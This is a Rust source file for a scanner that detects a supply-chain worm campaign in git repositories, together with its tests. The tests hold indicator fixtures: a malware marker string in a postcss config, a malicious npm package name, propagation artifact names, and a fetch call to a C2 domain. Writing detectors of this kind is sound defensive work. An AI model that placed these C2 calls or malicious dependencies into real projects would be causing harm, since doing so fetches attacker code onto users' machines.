use std::path::{Path, PathBuf};

use globset::{Glob, GlobSet, GlobSetBuilder};
use rayon::prelude::*;

use crate::finding::{Finding, FindingKind, Severity};
use crate::git::reflog_has_amend;
use crate::matchers::signature_matches;
use crate::pack::{Pack, ScannedFile};
use crate::walk::{discover_repos, walk_repo_files};

#[derive(Debug, Clone, serde::Serialize)]
pub struct ScanReport {
    pub findings: Vec<Finding>,
    pub repos_scanned: usize,
}

fn build_globset(patterns: &[String]) -> GlobSet {
    let mut builder = GlobSetBuilder::new();
    for pattern in patterns {
        if let Ok(glob) = Glob::new(pattern) {
            builder.add(glob);
        }
        // Bare filename patterns should also match at any depth (monorepos
        // place config files under apps/*, packages/*, etc.).
        if !pattern.contains('/') {
            if let Ok(nested) = Glob::new(&format!("**/{pattern}")) {
                builder.add(nested);
            }
        }
    }
    builder.build().unwrap_or_else(|_| GlobSet::empty())
}

fn check_artifacts(repo: &Path, pack: &Pack) -> Vec<Finding> {
    let mut findings = Vec::new();
    for artifact in &pack.manifest.artifacts {
        if repo.join(&artifact.path).is_file() {
            findings.push(Finding {
                campaign: pack.manifest.id.clone(),
                severity: pack.manifest.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(PathBuf::from(&artifact.path)),
                signature_id: format!("artifact:{}", artifact.path),
                kind: FindingKind::Artifact,
                evidence: format!("{} present ({})", artifact.path, artifact.label),
                remediable: true,
                online: None,
            });
        }
    }
    findings
}

fn check_gitignore(repo: &Path, pack: &Pack) -> Vec<Finding> {
    let mut findings = Vec::new();
    if pack.manifest.gitignore_injections.is_empty() {
        return findings;
    }
    let content = match std::fs::read_to_string(repo.join(".gitignore")) {
        Ok(c) => c,
        Err(_) => return findings,
    };
    let lines: Vec<&str> = content.lines().map(|l| l.trim()).collect();
    for injected in &pack.manifest.gitignore_injections {
        if lines.iter().any(|l| l == injected) {
            findings.push(Finding {
                campaign: pack.manifest.id.clone(),
                severity: pack.manifest.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(PathBuf::from(".gitignore")),
                signature_id: format!("gitignore:{injected}"),
                kind: FindingKind::GitignoreInjection,
                evidence: format!("'{injected}' injected into .gitignore"),
                remediable: true,
                online: None,
            });
        }
    }
    findings
}

fn check_npm(repo: &Path, pack: &Pack) -> Vec<Finding> {
    let mut findings = Vec::new();
    if pack.manifest.bad_npm_packages.is_empty() {
        return findings;
    }
    let content = match std::fs::read_to_string(repo.join("package.json")) {
        Ok(c) => c,
        Err(_) => return findings,
    };
    for bad in &pack.manifest.bad_npm_packages {
        // Match the dependency key as it appears in package.json ("name":).
        let needle = format!("\"{bad}\"");
        if content.contains(&needle) {
            findings.push(Finding {
                campaign: pack.manifest.id.clone(),
                severity: pack.manifest.severity.clone(),
                repo: repo.to_path_buf(),
                file: Some(PathBuf::from("package.json")),
                signature_id: format!("npm:{bad}"),
                kind: FindingKind::NpmPackage,
                evidence: format!("malicious dependency '{bad}' in package.json"),
                remediable: false,
                online: None,
            });
        }
    }
    findings
}

pub fn scan_repo(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let files = walk_repo_files(repo);

    for pack in packs {
        let globset = build_globset(&pack.manifest.target_files);
        for file in &files {
            let rel = file.strip_prefix(repo).unwrap_or(file);
            if !globset.is_match(rel) {
                continue;
            }
            let content = match std::fs::read_to_string(file) {
                Ok(c) => c,
                Err(_) => continue, // binary/unreadable: skip text scan
            };
            for sig in &pack.manifest.content_signatures {
                if signature_matches(sig, &content) {
                    findings.push(Finding {
                        campaign: pack.manifest.id.clone(),
                        severity: pack.manifest.severity.clone(),
                        repo: repo.to_path_buf(),
                        file: Some(rel.to_path_buf()),
                        signature_id: sig.id.clone(),
                        kind: FindingKind::ContentSignature,
                        evidence: format!("content signature '{}' matched", sig.id),
                        remediable: true,
                        online: None,
                    });
                }
            }
            // C2 indicator domains referenced in a scanned config file. Caught
            // even when no content signature fires (e.g. a rotated payload).
            for domain in &pack.manifest.ioc_domains {
                if content.contains(domain) {
                    findings.push(Finding {
                        campaign: pack.manifest.id.clone(),
                        severity: Severity::Medium,
                        repo: repo.to_path_buf(),
                        file: Some(rel.to_path_buf()),
                        signature_id: format!("ioc-domain:{domain}"),
                        kind: FindingKind::IocDomain,
                        evidence: format!("C2 indicator domain '{domain}' referenced"),
                        remediable: false,
                        online: None,
                    });
                }
            }
            if let Some(analyzer) = &pack.analyzer {
                let scanned = ScannedFile {
                    repo: repo.to_path_buf(),
                    path: rel.to_path_buf(),
                    content,
                };
                findings.extend(analyzer.analyze(&scanned));
            }
        }

        findings.extend(check_artifacts(repo, pack));
        findings.extend(check_gitignore(repo, pack));
        findings.extend(check_npm(repo, pack));
    }

    if !findings.is_empty() && reflog_has_amend(repo) {
        let campaign = findings[0].campaign.clone();
        findings.push(Finding {
            campaign,
            severity: Severity::Medium,
            repo: repo.to_path_buf(),
            file: None,
            signature_id: "git-reflog-amend".into(),
            kind: FindingKind::GitReflog,
            evidence: "amended commits found in reflog (consistent with worm propagation)".into(),
            remediable: false,
            online: None,
        });
    }
    findings
}

pub fn scan(roots: &[PathBuf], packs: &[Pack]) -> ScanReport {
    let mut repos: Vec<PathBuf> = Vec::new();
    for root in roots {
        repos.extend(discover_repos(root));
    }
    repos.sort();
    repos.dedup();

    let findings: Vec<Finding> = repos
        .par_iter()
        .flat_map(|repo| scan_repo(repo, packs))
        .collect();

    ScanReport {
        findings,
        repos_scanned: repos.len(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::finding::Severity;
    use crate::matchers::{ContentSignature, SignatureKind};
    use crate::pack::{PackManifest, ScannedFile};
    use std::fs;
    use tempfile::TempDir;

    fn literal_pack() -> Pack {
        let manifest = PackManifest {
            id: "polinrider".into(),
            name: "PolinRider".into(),
            description: String::new(),
            references: vec![],
            severity: Severity::Critical,
            target_files: vec!["postcss.config.mjs".into()],
            content_signatures: vec![ContentSignature {
                id: "primary".into(),
                kind: SignatureKind::Literal,
                value: "rmcej%otb%".into(),
            }],
            artifacts: vec![],
            gitignore_injections: vec![],
            bad_npm_packages: vec![],
            ioc_domains: vec![],
            analyzer: None,
            remediation: None,
        };
        Pack { manifest, analyzer: None }
    }

    fn make_repo(tmp: &TempDir) -> PathBuf {
        let repo = tmp.path().join("proj");
        fs::create_dir_all(repo.join(".git")).unwrap();
        repo
    }

    #[test]
    fn flags_infected_config_file() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("postcss.config.mjs"),
            "export default {};\nglobal['!']='8-270-2';var x='rmcej%otb%';",
        )
        .unwrap();

        let findings = scan_repo(&repo, &[literal_pack()]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].campaign, "polinrider");
        assert_eq!(findings[0].signature_id, "primary");
    }

    #[test]
    fn clean_config_file_not_flagged() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "export default {};\n").unwrap();
        assert!(scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn non_target_file_ignored() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // Signature present, but in a file that is not a target.
        fs::write(repo.join("README.md"), "rmcej%otb%").unwrap();
        assert!(scan_repo(&repo, &[literal_pack()]).is_empty());
    }

    #[test]
    fn scan_reports_repo_count_across_roots() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
        let report = scan(&[tmp.path().to_path_buf()], &[literal_pack()]);
        assert_eq!(report.repos_scanned, 1);
        assert_eq!(report.findings.len(), 1);
    }

    #[test]
    fn analyzer_findings_are_included() {
        struct Stub;
        impl crate::pack::CampaignAnalyzer for Stub {
            fn id(&self) -> &str { "polinrider" }
            fn analyze(&self, file: &ScannedFile) -> Vec<Finding> {
                if file.content.contains("MDy") {
                    vec![Finding {
                        campaign: "polinrider".into(),
                        severity: Severity::Critical,
                        repo: file.repo.clone(),
                        file: Some(file.path.clone()),
                        signature_id: "analyzer".into(),
                        kind: FindingKind::Analyzer,
                        evidence: "stub".into(),
                        remediable: true,
                        online: None,
                    }]
                } else {
                    vec![]
                }
            }
        }
        let mut pack = literal_pack();
        pack.analyzer = Some(Box::new(Stub));

        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("postcss.config.mjs"), "var MDy = 1; rmcej%otb%").unwrap();

        let findings = scan_repo(&repo, &[pack]);
        // one content-signature finding + one analyzer finding
        assert_eq!(findings.len(), 2);
        assert!(findings.iter().any(|f| f.kind == FindingKind::Analyzer));
    }

    #[test]
    fn flags_artifact_file() {
        let mut pack = literal_pack();
        pack.manifest.artifacts = vec![crate::pack::Artifact {
            path: "temp_auto_push.bat".into(),
            label: "Propagation script".into(),
        }];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join("temp_auto_push.bat"), "@echo off").unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::Artifact
            && f.file == Some(PathBuf::from("temp_auto_push.bat"))));
    }

    #[test]
    fn flags_gitignore_injection() {
        let mut pack = literal_pack();
        pack.manifest.gitignore_injections = vec!["config.bat".into()];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(repo.join(".gitignore"), "node_modules\nconfig.bat\n").unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::GitignoreInjection));
    }

    #[test]
    fn flags_malicious_npm_dependency() {
        let mut pack = literal_pack();
        pack.manifest.bad_npm_packages = vec!["tailwindcss-style-animate".into()];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        fs::write(
            repo.join("package.json"),
            r#"{"dependencies":{"tailwindcss-style-animate":"^1.1.6","react":"18"}}"#,
        )
        .unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::NpmPackage
            && f.evidence.contains("tailwindcss-style-animate")));
    }

    #[test]
    fn reflog_finding_only_when_other_findings_present() {
        use std::process::Command;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git").arg("-C").arg(repo).args(args)
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status().unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "c"]);
        std::fs::write(repo.join("postcss.config.mjs"), "export default {};\nrmcej%otb%").unwrap();
        git(&repo, &["commit", "-q", "-a", "--amend", "-m", "c"]);

        let findings = scan_repo(&repo, &[literal_pack()]);
        // content-signature finding + reflog finding
        assert!(findings.iter().any(|f| f.kind == FindingKind::GitReflog));

        // A repo with an amend but no other findings gets NO reflog finding.
        let tmp2 = TempDir::new().unwrap();
        let clean = tmp2.path().join("proj");
        std::fs::create_dir_all(&clean).unwrap();
        git(&clean, &["init", "-q"]);
        std::fs::write(clean.join("postcss.config.mjs"), "export default {};").unwrap();
        git(&clean, &["add", "."]);
        git(&clean, &["commit", "-q", "-m", "c"]);
        git(&clean, &["commit", "-q", "-a", "--amend", "-m", "c2"]);
        assert!(!scan_repo(&clean, &[literal_pack()]).iter().any(|f| f.kind == FindingKind::GitReflog));
    }

    #[test]
    fn detects_config_in_subdirectory() {
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        let nested = repo.join("packages/web");
        fs::create_dir_all(&nested).unwrap();
        fs::write(nested.join("postcss.config.mjs"), "rmcej%otb%").unwrap();

        let findings = scan_repo(&repo, &[literal_pack()]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::ContentSignature
            && f.file == Some(PathBuf::from("packages/web/postcss.config.mjs"))));
    }

    #[test]
    fn flags_ioc_domain_even_without_content_signature() {
        let mut pack = literal_pack();
        pack.manifest.ioc_domains = vec!["default-configuration.vercel.app".into()];
        let tmp = TempDir::new().unwrap();
        let repo = make_repo(&tmp);
        // No content signature present — only the C2 domain reference.
        fs::write(
            repo.join("postcss.config.mjs"),
            "fetch('https://default-configuration.vercel.app/settings/mac')",
        )
        .unwrap();

        let findings = scan_repo(&repo, &[pack]);
        assert!(findings.iter().any(|f| f.kind == FindingKind::IocDomain));
        assert!(!findings.iter().any(|f| f.kind == FindingKind::ContentSignature));
    }
}
